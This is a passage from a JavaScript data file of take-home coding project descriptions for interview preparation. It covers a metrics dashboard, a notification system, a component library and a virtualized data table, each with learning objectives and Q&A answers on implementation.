      { question: 'How do I handle request transformation?', answer: 'Support per-route request and response transformations configured in the route definition. Request transformations applied before proxying: add headers (inject X-Request-ID with a UUID, X-Forwarded-For with client IP, X-Forwarded-Proto with the protocol), remove headers (strip internal-only headers like X-Debug-Mode from client requests), rewrite path (strip prefix, add prefix, or regex replace), and add default body fields (merge default values into JSON request bodies). Response transformations applied before returning to the client: add headers (CORS headers, security headers like X-Content-Type-Options), remove headers (strip internal upstream headers like X-Internal-Trace-ID that should not be exposed), and modify response body (remove fields, add wrapper). Implement transformations as a middleware that reads the route config and applies each transformation in order. Use a plugin architecture so new transformation types can be added without modifying the core pipeline.' },
      { question: 'How do I implement health checks for upstream services?', answer: 'Active health checks: the gateway periodically sends HTTP requests to each upstream service health endpoint (GET /health) every 10 seconds. Track the response: if the health check fails 3 consecutive times, mark the upstream as unhealthy and stop routing traffic to it (the circuit breaker should also open). When the health check succeeds again for 2 consecutive times, mark it as healthy and resume routing. Passive health checks: observe real traffic responses. If an upstream returns 5xx errors above a threshold, mark it as degraded. Expose a gateway-level health endpoint (GET /gateway/health) that aggregates all upstream statuses: return 200 if all critical upstreams are healthy, 503 if any critical upstream is down. Include a JSON body listing each upstream and its status. This endpoint is what load balancers and orchestrators (Kubernetes, ECS) use to determine if the gateway instance itself is healthy.' },
      { question: 'How do I implement load balancing across multiple instances?', answer: 'When an upstream service has multiple instances, the gateway must distribute traffic among them. Implement weighted round-robin: each upstream instance has a weight (default 1, higher means more traffic). Maintain a current index and a running weight counter in Redis (shared across gateway instances). On each request: advance the index to the next instance using modular arithmetic weighted by the instance weights. For example, with three instances weighted 5, 3, 2, out of every 10 requests, instance A gets 5, B gets 3, C gets 2. When a health check marks an instance as unhealthy, remove it from the rotation until it recovers. Also implement sticky sessions for stateful upstreams: hash the client IP or a session cookie to consistently route the same client to the same upstream instance, unless that instance becomes unhealthy. For the take-home, round-robin with health awareness is sufficient; mention consistent hashing and least-connections algorithms as production alternatives.' },
    ],
  },
  {
    id: 'realtime-dashboard',
    title: 'Real-time Metrics Dashboard',
    icon: 'trendingUp',
    color: '#22c55e',
    difficulty: 'advanced',
    estimatedTime: '7-9 hours',
    techStack: ['React', 'Node.js', 'WebSocket', 'InfluxDB/TimescaleDB', 'D3.js', 'react-grid-layout'],
    questions: 6,
    description: 'Build a Grafana-style metrics dashboard with real-time charts, configurable panels, alerting rules, and time range selection.',
    introduction: 'Create a monitoring dashboard that displays real-time metrics (CPU, memory, request latency, error rates) with live-updating charts. Users configure panels, set alert thresholds, choose time ranges, and arrange widgets in a grid layout.\n\nObservability dashboards are critical infrastructure for every production system. Tools like Grafana, Datadog, and New Relic are used daily by engineering teams to monitor system health, investigate incidents, and track performance trends. Building a simplified version teaches you the core patterns: time-series data storage and query, real-time chart rendering, configurable panel layouts, and alerting logic.\n\nThe technical challenges span both backend and frontend. On the backend, time-series data requires specialized storage that handles high write throughput and efficient range queries with downsampling. On the frontend, rendering multiple live-updating charts at 60fps while receiving WebSocket data streams requires careful batching, memoization, and canvas-based rendering for large datasets.\n\nFor infrastructure and platform engineering interviews, this project is directly relevant. You can discuss time-series data modeling, downsampling strategies (raw data for recent timeframes, aggregates for historical), WebSocket streaming architecture, and alert state machine design with concrete implementation details.',
    interviewRelevance: 'Observability is a key topic for infrastructure and platform engineering interviews. Building a dashboard demonstrates: time-series data handling, WebSocket streaming, efficient chart rendering, and alerting logic. Time-series data storage with downsampling shows database performance optimization thinking. Real-time WebSocket updates demonstrate event-driven architecture. Configurable panel layout shows component architecture and JSON-driven UI patterns. The alerting state machine demonstrates finite automaton design. Chart rendering performance optimization shows frontend engineering depth. This project opens discussions about metric collection agents, distributed tracing, log aggregation, and SLO/SLA monitoring.',
    learningObjectives: [
      'Store and query time-series data efficiently using InfluxDB or TimescaleDB',
      'Build real-time chart updates using WebSocket data push',
      'Create configurable dashboard panels with drag-and-drop grid layout',
      'Implement alerting rules: threshold, rate-of-change, and anomaly detection',
      'Design a downsampling strategy that keeps query performance constant regardless of time range',
      'Build multiple chart types: line, bar, gauge, stat card, and heatmap',
      'Implement time range selection with presets (last 5m, 1h, 24h, 7d) and custom range picker',
      'Create a query builder UI that constructs time-series queries without writing raw SQL',
      'Optimize chart rendering for datasets with 10,000+ points using canvas-based rendering',
      'Build dashboard templates that can be cloned and shared between users',
    ],
    keyQuestions: [
      { question: 'How do I handle time-series data efficiently?', answer: 'Use a time-series database optimized for write-heavy workloads and range queries. InfluxDB uses a custom storage engine designed for time-series (append-only, compressed, columnar). TimescaleDB extends PostgreSQL with hypertables that automatically partition by time, giving you SQL familiarity with time-series performance. Store each metric as: { metric_name, tags: { host, service, region }, value, timestamp }. Tags enable filtering (show CPU for host=web-01) and grouping (average CPU across all hosts). Critical optimization: downsample older data using continuous aggregates. Keep raw data for the last 1 hour (query resolution: per-second), 1-minute averages for the last 24 hours, 5-minute averages for the last 7 days, and 1-hour averages for the last 90 days. Drop raw data older than the retention period. This keeps query performance constant: a 7-day chart queries exactly 2,016 points (7 * 24 * 12 five-minute buckets) regardless of write volume.' },
      { question: 'How do I stream real-time data to charts?', answer: 'Establish a WebSocket connection from the client to the server when the dashboard loads. The server subscribes to the time-series database change stream or polls at a regular interval (every 1-5 seconds) and pushes new data points to connected clients. On the client side, each chart panel maintains a data buffer (array of { timestamp, value } points). When new data arrives via WebSocket, append to the buffer and remove points that fall outside the visible time window. Batch chart updates using requestAnimationFrame to avoid re-rendering charts on every incoming data point. For D3.js charts: update the x-axis domain to shift the time window, transition existing path data smoothly, and enter/exit new and old points. For very high-frequency data (more than 10 updates per second), accumulate points in a buffer and flush to the chart every 100ms. This prevents the rendering from becoming the bottleneck.' },
      { question: 'How should the alerting system work?', answer: 'Model alert rules as configurable objects: { id, metric: "cpu_usage", tags: { host: "web-01" }, condition: ">", threshold: 90, duration: "5m", severity: "critical", channels: ["email", "slack"] }. The alert evaluator runs every 10 seconds, querying the most recent data for each rule metric. Each rule tracks its own state machine: OK (condition not met), Pending (condition met but duration not elapsed, for example CPU above 90% for less than 5 minutes), Firing (condition met for the full duration, notifications sent), and Resolved (condition no longer met, resolution notification sent). State transitions trigger notifications. Implement alert grouping: if 10 hosts trigger the same CPU alert within 1 minute, send a single grouped notification instead of 10 individual ones. Add a cooldown period (for example, 15 minutes) after resolution before the same rule can fire again, preventing rapid-fire alerts for flapping metrics. Store alert history in a database table for incident review.' },
      { question: 'How do I make the dashboard configurable?', answer: 'Store the dashboard configuration as a JSON document: { id, title, panels: [{ id, type: "line", title: "CPU Usage", query: { metric: "cpu_usage", aggregation: "mean", groupBy: "host", interval: "1m" }, position: { x: 0, y: 0, w: 6, h: 4 }, thresholds: [{ value: 80, color: "yellow" }, { value: 95, color: "red" }], timeRange: "inherit" }] }. Use react-grid-layout for drag-and-drop panel arrangement: users can resize, move, and rearrange panels in a responsive grid. Each panel type (line, bar, gauge, stat, heatmap) is a separate React component that receives the query results and thresholds as props. Persist the layout to the database per user. Support dashboard templates: pre-built dashboards for common use cases (Node.js application monitoring, PostgreSQL performance, Redis health) that users can clone and customize. Add a dashboard variable system (for example, $host dropdown) that injects selected values into all panel queries, allowing a single dashboard to monitor any host.' },
      { question: 'How do I optimize chart rendering performance?', answer: 'When displaying time-series data over long time ranges, charts can have 10,000 to 100,000 data points. SVG-based charts (standard D3) become sluggish above 5,000 points because each point is a DOM element. Three optimization strategies: 1) Data decimation: reduce the number of rendered points by using the Largest Triangle Three Bucket (LTTB) algorithm, which preserves the visual shape of the data while reducing to a target number of points (typically 1,000-2,000 for a chart width). 2) Canvas rendering: switch from SVG to HTML Canvas for the chart body. Canvas renders as a single bitmap, so 100,000 drawLine calls are still fast. Use SVG only for axes and labels (which are few and benefit from DOM accessibility). 3) Windowed updates: when streaming real-time data, do not re-render the entire chart. Instead, shift the existing canvas pixels left by the time delta and only draw the new data points on the right edge. This makes updates O(new points) rather than O(total points).' },
      { question: 'How do I build the time range selection?', answer: 'Provide two mechanisms for selecting the time range. First, preset buttons: "Last 5m", "Last 15m", "Last 1h", "Last 6h", "Last 24h", "Last 7d", "Last 30d". Each preset calculates the from/to timestamps relative to now and triggers a query refresh. Second, a custom range picker: a calendar widget that lets users select arbitrary start and end dates with time precision. When a custom range is selected, disable real-time streaming and show a static snapshot. When a preset with "Last X" is selected, enable real-time mode where the time window slides forward as new data arrives. Implement zoom: allow users to click-and-drag on a chart to zoom into a specific time range. Double-click to zoom back out to the dashboard-level time range. Store the selected time range in URL query parameters (?from=now-1h&to=now) so dashboards are shareable and bookmarkable with the specific time context preserved.' },
    ],
  },
  {
    id: 'event-notification-system',
    title: 'Event-Driven Notification System',
    icon: 'bell',
    color: '#ef4444',
    difficulty: 'advanced',
    estimatedTime: '8-10 hours',
    techStack: ['Node.js', 'RabbitMQ/Redis Streams', 'PostgreSQL', 'React', 'WebSocket', 'Resend/SendGrid'],
    questions: 6,
    description: 'Build a notification system with event publishing, multi-channel delivery (email, push, in-app), user preferences, and delivery tracking.',
    introduction: 'Create a scalable notification service. Events flow in (user_signed_up, order_placed, payment_failed), notification templates are applied, and messages are delivered through the user\'s preferred channels. Track delivery status, handle retries, and respect user preferences.\n\nNotification systems are one of the most common microservices in production architectures. Every application with users needs to send emails, push notifications, in-app messages, and SMS alerts. Building a dedicated notification service that handles all of these channels through a unified event-driven pipeline teaches you patterns that apply to any event-driven architecture.\n\nThe engineering complexity comes from the multi-channel delivery pipeline. Each channel has different delivery semantics: email is fire-and-forget with eventual delivery, push notifications require device token management and can silently fail, in-app notifications need real-time WebSocket delivery, and SMS has strict rate limits and delivery receipts. Handling retries, respecting user preferences, enforcing quiet hours, and tracking delivery status across all channels requires careful orchestration.\n\nFor system design interviews, notification systems are a staple question. Building one gives you concrete experience with event-driven architecture, pub/sub patterns, template rendering, multi-channel delivery, idempotency, and user preference management. You can discuss fan-out strategies, delivery guarantees, and scaling to millions of notifications per day with working code to back up your claims.',
    interviewRelevance: 'Notification systems are a classic system design question. Building one covers: event-driven architecture, pub/sub patterns, template engines, multi-channel delivery, idempotency, and user preference management. The event bus design shows pub/sub and message queue mastery. The template system demonstrates data-driven content rendering. Multi-channel delivery shows you can integrate with multiple external services and handle their different failure modes. User preference management with quiet hours and frequency caps shows product thinking. Delivery tracking with status webhooks shows integration complexity awareness. This project opens discussions about notification prioritization, batching strategies, and A/B testing notification content.',
    learningObjectives: [
      'Build an event bus using RabbitMQ or Redis Streams for pub/sub',
      'Create a template system that renders notifications from event data',
      'Implement multi-channel delivery: email (Resend), push (web push), in-app (WebSocket)',
      'Build user preference management: channel selection, quiet hours, frequency caps',
      'Track delivery status across all channels: sent, delivered, opened, clicked, failed',
      'Implement event deduplication using idempotency keys to prevent duplicate notifications',
      'Build a notification center UI showing all in-app notifications with read/unread state',
      'Handle delivery retries with per-channel retry strategies and dead letter queues',
      'Create an admin UI for managing notification templates with live preview',
      'Implement notification batching to combine multiple rapid events into a single digest message',
    ],
    keyQuestions: [
      { question: 'How does the event flow work?', answer: 'The pipeline has five stages. Stage 1 - Publishing: a producer service publishes a business event to the message bus: { type: "order_placed", userId: 123, data: { orderId: "ABC-123", total: 49.99, items: [...] }, idempotencyKey: "order-placed-ABC-123" }. Stage 2 - Routing: the notification router consumes events from the bus, checks the idempotency key against a Redis set to prevent duplicates, and looks up which notification templates match this event type. Stage 3 - Rendering: the template engine fills each template with the event data, producing channel-specific content (HTML for email, plain text for push, rich object for in-app). Stage 4 - Preference filtering: for each of the user enabled channels, check quiet hours (is the user timezone currently in their quiet window?), check frequency cap (Redis counter tracking notifications sent this hour), and skip channels that fail these checks. Stage 5 - Delivery: dispatch to each channel delivery service (Resend for email, FCM for push, WebSocket for in-app). Record delivery status in the notifications table. Each stage is a separate consumer that can be scaled independently.' },
      { question: 'How do I implement the template system?', answer: 'Store templates in a PostgreSQL table: { id, event_type, channel (email/push/in-app/sms), subject_template, body_template, enabled, created_at, updated_at }. Use Handlebars for template rendering: variable interpolation with double braces (Your order number {{orderId}} for ${{total}} has been confirmed), conditionals ({{#if items.length > 3}}and {{subtract items.length 3}} more items{{/if}}), and loops ({{#each items}}{{this.name}} x{{this.quantity}}{{/each}}). Register custom Handlebars helpers for common formatting: {{currency total}} renders "$49.99", {{dateFormat createdAt "MMM d, yyyy"}} renders "Jan 15, 2026". Build an admin UI with a template editor that shows a live preview rendered with sample event data. Support per-channel templates: the email version includes rich HTML with brand styling, the push version is a short plain text summary, and the in-app version is a structured JSON object with an icon, title, body, and action URL.' },
      { question: 'How do I handle delivery retries?', answer: 'Each channel has different failure modes and retry strategies. Email (Resend/SendGrid): transient SMTP errors (timeout, temporary rejection) often succeed on retry. Retry with exponential backoff: 1 minute, 5 minutes, 30 minutes, 2 hours. Max 4 retries. Permanent failures (invalid email address, domain does not exist) should not be retried; mark the notification as permanently failed and flag the user email for verification. Push (FCM/APNs): if the device token is invalid, the push service returns a specific error code. Trigger a token refresh flow and retry once. If the token is still invalid, delete it and mark the push channel as unavailable for that user. In-app (WebSocket): if the user is not currently connected, store the notification in the database and deliver it when they next connect. No retry needed since the database is the source of truth. After max retries are exhausted for any channel, move the notification to a dead letter table with the failure reason for manual review.' },
      { question: 'How do user preferences work?', answer: 'Preferences are stored in a user_notification_preferences table: { user_id, channel (email/push/in-app/sms), enabled (boolean), quiet_hours_start (time, for example 22:00), quiet_hours_end (time, for example 08:00), timezone (for example "America/New_York"), frequency_cap_hourly (integer, default 10) }. Before sending a notification on any channel, the preference filter checks three conditions. First: is this channel enabled for the user? If not, skip. Second: is the current time in the user timezone within their quiet hours? If so, queue the notification for delivery at the end of the quiet period. Third: has the user received more than their hourly frequency cap? Check a Redis counter (INCR user:{id}:notif_count:{hour}, EXPIRE 3600). If exceeded, skip or queue for the next hour. Default preferences for new users: all channels enabled, no quiet hours, 10 notifications per hour cap. Provide a preferences UI where users can toggle channels, set quiet hours, and adjust frequency caps per notification type (for example, allow marketing but limit to daily).' },
      { question: 'How do I track delivery status?', answer: 'Track each notification through its lifecycle in a notifications table: { id, user_id, event_type, channel, status (queued/sent/delivered/opened/clicked/failed), content_snapshot (the rendered template for audit), sent_at, delivered_at, opened_at, clicked_at, failure_reason, retry_count }. Update status at each stage: queued when created, sent when the delivery API returns success, delivered when a delivery webhook confirms receipt (email: Resend sends delivery webhooks, push: FCM provides delivery receipts). For email, track opens using a tracking pixel (a 1x1 transparent image with a unique URL that records the open when loaded) and clicks using a redirect URL that records the click and redirects to the target. For in-app notifications, track read status when the user views the notification in the notification center, and clicked when they tap the action button. Aggregate these statuses into a notification analytics dashboard showing: delivery rate by channel, open rate for emails, click-through rate, failure rate, and average time to delivery.' },
      { question: 'How do I implement notification batching?', answer: 'When multiple events of the same type occur rapidly (for example, 20 new followers in 5 minutes), sending 20 individual notifications is overwhelming. Implement a batching system: when a notification is queued, check if there is an existing batch window open for this user and event type. If so, add the event data to the batch instead of sending immediately. If not, create a new batch with a window (for example, 5 minutes). After the window expires, render a digest template: "You have 20 new followers: Alice, Bob, Carol, and 17 others." The batch is stored in Redis as a list (RPUSH batch:{userId}:{eventType} eventData) with an expiry matching the window. A scheduled job runs every minute checking for expired batches, renders the digest template, and dispatches through the normal delivery pipeline. Configure batch windows per event type: follow events batch for 5 minutes, comment events batch for 10 minutes, marketing events batch daily. High-priority events (payment failed, security alert) should never be batched and should bypass the batching system entirely.' },
    ],
  },

  // ═══════════════════════════════════════════════════════════
  // FRONTEND CHALLENGES
  // ═══════════════════════════════════════════════════════════
  {
    id: 'design-system-library',
    title: 'Design System Component Library',
    icon: 'layout',
    color: '#ec4899',
    difficulty: 'intermediate',
    estimatedTime: '6-8 hours',
    techStack: ['React', 'TypeScript', 'Storybook', 'Tailwind CSS', 'Radix UI', 'cva'],
    questions: 6,
    description: 'Build a reusable component library with Button, Input, Select, Modal, Toast, DataTable, and Form components — fully typed, accessible, and documented.',
    introduction: 'Create a production-grade component library like Shadcn/UI. Each component is fully typed with TypeScript, follows WAI-ARIA accessibility guidelines, supports theming (light/dark), and is documented in Storybook with interactive examples.\n\nDesign systems are the foundation of scalable frontend development. Companies like Shopify (Polaris), Adobe (Spectrum), and GitHub (Primer) invest heavily in component libraries because they enforce consistency, reduce duplicate code, and encode accessibility best practices that individual developers might otherwise overlook. Building your own teaches you the patterns that power these production systems.\n\nThe engineering depth comes from designing APIs that other developers will use. Every prop decision matters: should the Button variant be a string union or an enum? Should the Modal use compound components or a single component with many props? Should the Select support render props for custom option rendering? These API design decisions determine how ergonomic, composable, and maintainable the library will be.\n\nFor senior frontend interviews, component library design is a core competency. Interviewers frequently ask candidates to design a component API on the spot, discuss accessibility patterns for complex widgets, and critique existing libraries. Having built one yourself gives you authoritative answers grounded in implementation experience.',
    interviewRelevance: 'Senior frontend interviews often ask candidates to build or critique component APIs. A design system project demonstrates: TypeScript generics, accessibility expertise, compound component patterns, and the ability to design APIs that other developers will use. Accessibility implementation shows you understand WAI-ARIA patterns for complex widgets (focus traps, keyboard navigation, screen reader announcements). Compound component patterns demonstrate advanced React composition. TypeScript generics for polymorphic components show type system mastery. Storybook documentation shows you can communicate component usage to other developers. This project opens discussions about design token systems, component versioning and breaking changes, and tree-shaking for library consumers.',
    learningObjectives: [
      'Build accessible components following WAI-ARIA patterns with keyboard navigation',
      'Design composable APIs using compound components and render props',
      'Implement theming with CSS variables and Tailwind CSS utility-first approach',
      'Document components in Storybook with controls, docs, and accessibility tests',
      'Use class-variance-authority (cva) for type-safe variant management across components',
      'Implement focus trap for modals and focus ring management for keyboard navigation',
      'Build a toast notification system with stacking, auto-dismiss, and position variants',
      'Create a polymorphic component pattern with the "as" prop for render element flexibility',
      'Forward refs and spread remaining props for seamless integration with form libraries',
      'Set up visual regression testing with Chromatic to catch unintended style changes',
    ],
    keyQuestions: [
      { question: 'What components should I build?', answer: 'Build a core set that covers the most common UI needs. Button: variants (primary, secondary, outline, ghost, destructive), sizes (sm, md, lg), loading state with spinner, disabled state, and icon support (leading/trailing). Input: label, placeholder, helper text, error message, disabled state, prefix/suffix elements, and integration with form libraries via React.forwardRef. Select: single and multi-select modes, searchable with debounced filter, keyboard navigation (up/down arrows, Enter to select, Escape to close), and custom option rendering via render props. Modal: focus trap that cycles Tab within the dialog, Escape to close, click-outside to close, return focus to trigger on close, and scroll lock on the body. Toast: four positions (top-right, top-left, bottom-right, bottom-left), auto-dismiss with configurable duration, stacking with newest on top, dismiss on click or swipe, and severity variants (success, error, warning, info). DataTable: column sorting, per-column filters, pagination, row selection with checkbox column, and expandable rows. Each component has a complete TypeScript props interface with JSDoc comments.' },
      { question: 'How do I make components accessible?', answer: 'Follow the WAI-ARIA Authoring Practices Guide for each widget pattern. Button: ensure role="button" (automatic for button elements, add for non-button elements), aria-pressed for toggle buttons, aria-expanded for menu buttons, and visible focus ring on keyboard focus only (use :focus-visible). Modal: role="dialog", aria-modal="true", aria-labelledby pointing to the dialog title, focus trap (Tab and Shift+Tab cycle within the modal content), Escape key closes the dialog, and focus returns to the trigger element on close. Select: role="combobox" on the trigger, role="listbox" on the dropdown, role="option" on each item, aria-selected on the active option, aria-expanded on the trigger, and keyboard support (up/down arrows move selection, Enter confirms, type-ahead jumps to matching option). Use @testing-library/jest-dom matchers like toBeAccessible and toHaveAttribute to verify ARIA attributes in tests. Run axe-core audits in Storybook via the a11y addon to catch violations automatically.' },
      { question: 'How should the component API be designed?', answer: 'Use compound components for complex widgets that have multiple interactive parts. For Select: <Select value={value} onChange={setValue}><Select.Trigger>{label}</Select.Trigger><Select.Content><Select.Item value="a">Option A</Select.Item></Select.Content></Select>. This pattern gives consumers full control over rendering order and wrapper elements. Use the polymorphic "as" prop for rendering flexibility: <Button as="a" href="/link"> renders an anchor tag with button styling. Implement this with TypeScript generics: the component infers the correct HTML attributes based on the "as" value. Use cva (class-variance-authority) for variant management: define variant, size, and color scheme as a typed map, and cva generates the appropriate Tailwind class string. Always forward refs with React.forwardRef so form libraries like React Hook Form can register inputs. Spread remaining props (...rest) onto the root element so consumers can add custom data attributes, event handlers, and test IDs.' },
      { question: 'How do I set up Storybook?', answer: 'Each component gets a .stories.tsx file with multiple stories. The Default story shows the component with its most common props. Additional stories show each variant (all button variants side by side), edge cases (very long text, empty state), and interactive demos. Use Storybook args to expose all props as interactive controls in the Storybook UI. Add the @storybook/addon-a11y addon which runs axe-core on every story and displays accessibility violations in a dedicated panel. Create a Docs page for each component using MDX that includes: a description, usage example code, a table of all props with types and defaults, and guidance on when to use this component vs alternatives. Add a ThemeProvider decorator that wraps all stories and provides a dark mode toggle. For visual regression testing, connect Chromatic (by the Storybook team) which captures screenshots of every story on every commit and highlights visual changes for review.' },
      { question: 'How do I implement the toast notification system?', answer: 'The toast system has three parts: a ToastProvider context at the app root, a useToast hook for triggering toasts, and a ToastContainer that renders active toasts. The ToastProvider manages a queue of toast objects: { id, title, description, severity, duration, dismissible }. The useToast hook exposes toast.success(title, options), toast.error(title, options), etc. When a toast is created, add it to the queue with a unique ID and start a timer for auto-dismiss (default 5 seconds for success, 8 seconds for error, persistent for action-required). The ToastContainer renders at a fixed position (configurable: top-right, bottom-right, etc.) and maps the queue to ToastItem components. Toasts stack vertically with a gap, newest on top. Each toast has an enter animation (slide in from the right with opacity fade), and an exit animation (slide out) triggered by dismiss or timer expiry. Pause auto-dismiss on hover (the user is reading the toast). Limit maximum visible toasts to 5; queue additional toasts until space opens up.' },
      { question: 'How do I implement theming with CSS variables?', answer: 'Define a design token system using CSS custom properties on the :root element: --color-primary, --color-background, --color-foreground, --color-border, --radius-sm, --radius-md, --font-sans, --font-mono, etc. For dark mode, override these variables on a .dark class applied to the html element: .dark { --color-background: #0a0a0a; --color-foreground: #fafafa; }. In Tailwind, map these variables to theme values in tailwind.config: colors: { primary: "var(--color-primary)", background: "var(--color-background)" }. Components use Tailwind classes (bg-background, text-foreground, border-border) that automatically resolve to the correct values in light or dark mode. This approach has two advantages over Tailwind dark: prefix: 1) Custom themes beyond light/dark are just another set of CSS variable overrides, and 2) Components do not need conditional dark: classes, making the class strings shorter and the component code cleaner. Provide a useTheme hook that reads system preference (prefers-color-scheme media query), allows manual override, and persists the choice to localStorage.' },
    ],
  },
  {
    id: 'virtual-scroll-table',
    title: 'Data Table with Virtual Scrolling',
    icon: 'database',
    color: '#0891b2',
    difficulty: 'advanced',
    estimatedTime: '6-8 hours',
    techStack: ['React', 'TypeScript', 'TanStack Virtual', 'Tailwind CSS', 'TanStack Table'],
    questions: 6,
    description: 'Build a data table that handles 100K+ rows with virtual scrolling, column sorting, multi-criteria filtering, column resizing, and row selection.',
    introduction: 'Create a high-performance data table component. Render 100,000 rows smoothly using virtualization (only render visible rows + buffer). Add interactive features: click-to-sort columns, filter dropdowns per column, drag-to-resize columns, checkbox row selection, and CSV export.\n\nVirtual scrolling is the definitive performance optimization technique for large datasets in the browser. The principle is simple: instead of rendering 100,000 DOM rows (which would create 100,000+ DOM nodes and bring the browser to its knees), only render the 30-50 rows visible in the viewport plus a small buffer above and below. As the user scrolls, recycle DOM elements by updating their content and position.\n\nBuilding a data table with virtualization is one of the most technically demanding frontend projects because it combines multiple complex systems: a virtualization engine that calculates visible row ranges from scroll position, a sort system that handles 100K elements efficiently with stable multi-column comparisons, a filter system that needs indexed lookups for sub-millisecond filtering, column resizing with live drag feedback, and row selection with shift-click range semantics.\n\nFor performance-focused frontend interviews, this is the gold standard project. The classic question "How would you render a table with 100K rows?" has a concrete answer in your working implementation. You can demonstrate O(1) DOM rendering complexity, discuss memory-efficient sort and filter strategies, and show that the table maintains 60fps scrolling throughout.',
    interviewRelevance: 'Performance-focused frontend interviews love this: "How would you render a table with 100K rows?" This project proves you understand virtual scrolling, layout thrashing prevention, memoization, and DOM recycling. Virtualization demonstrates understanding of the browser rendering pipeline and why DOM node count matters for performance. The sort system shows algorithmic optimization awareness (stable sort, multi-column priority). The filter indexing strategy shows data structure knowledge applied to UI performance. Column resizing demonstrates mouse event handling and layout calculation skills. Row selection at scale shows knowledge of Set data structures for O(1) operations. This project opens discussions about server-side pagination vs client-side virtualization, Web Worker-based sorting, and accessibility challenges with virtual scrolling.',
    learningObjectives: [
      'Implement virtual scrolling using @tanstack/react-virtual for O(1) DOM rendering',
      'Build a column sort system with multi-column priority and stable sort',
      'Create per-column filters: text search, enum dropdown, date range, number range',
      'Add column resizing with drag handles and minimum/maximum width constraints',
      'Pre-index column values for sub-millisecond filter operations on 100K+ rows',
      'Implement shift-click range selection and select-all with filtered row awareness',
      'Build CSV export for selected rows or all filtered rows with proper escaping',
      'Add sticky header and sticky columns that remain visible during scroll',
      'Implement cell-level editing with Enter to edit, Escape to cancel, and Tab to move',
      'Handle dynamic row heights in the virtualizer for rows with expandable content',
    ],
    keyQuestions: [
      { question: 'How does virtual scrolling work?', answer: 'Virtual scrolling renders only the rows visible in the viewport plus a buffer (for example, 20 rows above and below the visible area). The scroll container has a fixed height equal to totalRows * rowHeight, creating the correct scrollbar size and position. Inside, a positioning container uses CSS transform: translateY(offsetPx) to shift the rendered rows to the correct vertical position. On each scroll event, the virtualizer calculates: startIndex = Math.floor(scrollTop / rowHeight) - buffer, endIndex = startIndex + visibleCount + 2 * buffer. Only rows in the [startIndex, endIndex] range are rendered as DOM elements. When the user scrolls, rows leaving the viewport are removed and new rows entering are created. @tanstack/react-virtual handles all this math and provides a virtualizer hook that returns the current visible items with their offsets. You provide the row renderer function. The result: whether the table has 100 rows or 1,000,000 rows, the DOM always contains only about 50-100 row elements, keeping rendering at a constant 60fps.' },
      { question: 'How do I maintain sort/filter performance at 100K rows?', answer: 'Sorting 100K rows with Array.prototype.sort takes approximately 50-100ms in V8, which is noticeable if triggered on every click. Optimize: memoize the sorted result with useMemo so it only recomputes when the sort column or direction changes. Use a stable sort comparator (for equal values, preserve original order by falling back to the original index) to prevent visual jitter when toggling between ascending and descending. For multi-column sort, chain comparators: compare by primary column first, then secondary on ties. For filtering, pre-build an inverted index on initial data load: Map<columnId, Map<value, Set<rowIndex>>>. Filtering by enum value becomes a Set lookup (O(1)). Combining filters is a Set intersection across columns. Text search filtering is inherently O(n) but can be accelerated by building a trie or prefix index. Memoize the filtered+sorted result: only recompute when filters change, and only re-sort when the sort config changes on an already-filtered dataset. With these optimizations, interactions feel instantaneous even at 100K rows.' },
      { question: 'How do I implement column resizing?', answer: 'Each column header has a resize handle (a thin vertical bar on the right edge, 4px wide, cursor: col-resize). On mousedown on the handle: capture the initial column width and the initial mouse X position. Register mousemove and mouseup handlers on the document (not the handle, so dragging outside the table still works). On mousemove: calculate the delta (currentMouseX - initialMouseX), compute the new width (initialWidth + delta), clamp it between minWidth (for example, 60px) and maxWidth (for example, 600px), and update the column width in state. Use CSS Grid with grid-template-columns set to explicit pixel values for all columns (for example, "120px 200px 150px 300px"). This ensures resizing one column does not affect others. Add a visual indicator: a semi-transparent blue line at the resize position during drag. On mouseup: finalize the width and remove the document event listeners. Store column widths in state so they persist across re-renders and can be saved to localStorage.' },
      { question: 'How do I handle row selection at scale?', answer: 'Use a Set<string> for selected row IDs, providing O(1) add, delete, and has operations. Single click: toggle the clicked row ID in the Set. Shift-click for range selection: store the last-clicked row index. On shift-click, select all rows between the last-clicked index and the current index in the filtered and sorted view. Ctrl/Cmd-click: toggle the individual row without affecting other selections. "Select all" checkbox in the header: toggle all currently filtered rows (important: not all 100K rows, only the ones matching current filters). This prevents accidentally selecting invisible rows. Display the selection count in a toolbar: "23 of 100,000 rows selected". Provide bulk actions: Delete Selected, Export Selected to CSV. For rendering performance, use React.memo on the row component and check if the row ID is in the selection Set. Since Set.has is O(1), this check is negligible. The row only re-renders when its selection state changes, not when other rows are selected.' },
      { question: 'How do I implement CSV export?', answer: 'Provide two export options: Export Selected (exports only selected rows) and Export All (exports all filtered rows, respecting current filter state). Build the CSV string in memory: start with a header row (column names joined by commas), then iterate the target rows and serialize each cell value. Handle CSV edge cases: values containing commas must be quoted, values containing double quotes must have quotes escaped (double them), newlines within values must be quoted, and null/undefined values should be empty strings. For 100K rows, building the CSV string can take 200-500ms. Use a Web Worker to avoid blocking the UI: transfer the row data to the worker, build the CSV there, and transfer the result back. Create a Blob from the CSV string, generate a temporary URL with URL.createObjectURL, and trigger a download via a dynamically created anchor element with the download attribute set to the filename. Revoke the object URL after the download starts to free memory.' },
      { question: 'How do I make the virtual table accessible?', answer: 'Virtual scrolling creates accessibility challenges because screen readers cannot perceive rows that are not in the DOM. Mitigate with ARIA attributes: set role="grid" on the table container, role="row" on each row, role="gridcell" on each cell. Add aria-rowcount={totalRows} on the grid to indicate the total number of rows even though most are not rendered. Set aria-rowindex on each visible row to its position in the full dataset (not its position in the rendered subset). This tells screen readers that row 5,001 is the 5,001st row, not the 1st visible row. For keyboard navigation: Arrow keys move between cells, Enter activates a cell (opens editor or follows link), Tab moves to the next focusable element outside the table. Announce sort changes with aria-live: when a user sorts a column, update an aria-live="polite" region with "Table sorted by Name ascending". These measures do not fully solve the accessibility problem (screen readers still cannot browse non-rendered rows), but they provide the best available experience within the constraints of virtualization.' },
    ],
  },
  {
    id: 'multi-step-form-wizard',
    title: 'Multi-step Form Wizard',
    icon: 'checkSquare',
    color: '#f59e0b',
    difficulty: 'intermediate',
    estimatedTime: '4-5 hours',
    techStack: ['React', 'TypeScript', 'Zod', 'React Hook Form', 'Tailwind CSS', 'Framer Motion'],
    questions: 6,
    description: 'Build a multi-step form with per-step validation, conditional steps, progress indicator, save draft, and review before submission.',
